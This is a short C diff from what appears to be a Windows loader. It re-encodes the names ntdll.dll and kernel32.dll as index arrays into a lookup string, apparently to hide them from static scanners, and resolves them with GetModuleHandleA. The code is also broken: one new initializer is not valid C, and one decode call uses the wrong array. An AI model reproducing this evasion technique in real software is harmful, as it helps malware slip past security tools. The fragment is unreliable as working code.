@@ -159,11 +159,11 @@ int main(int argc, char* argv[]) {
     SIZE_T coolSize = sizeof(cool);
     //Get a handle to the ntdll.dll library
     //hello
-    int ntt[] = { 13, 19, 3, 11, 11, 62, 3, 11, 11 };
+    int ntt[] = { [39, 45, 29, 37, 37, 62, 29, 37, 37] };
     const wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
     HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
     
-    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
+    int ws_lld_ker_32[] = {36, 30, 43, 39, 30, 37, 55, 54, 62, 29, 37, 37};
     const wchar_t* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
     HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
     
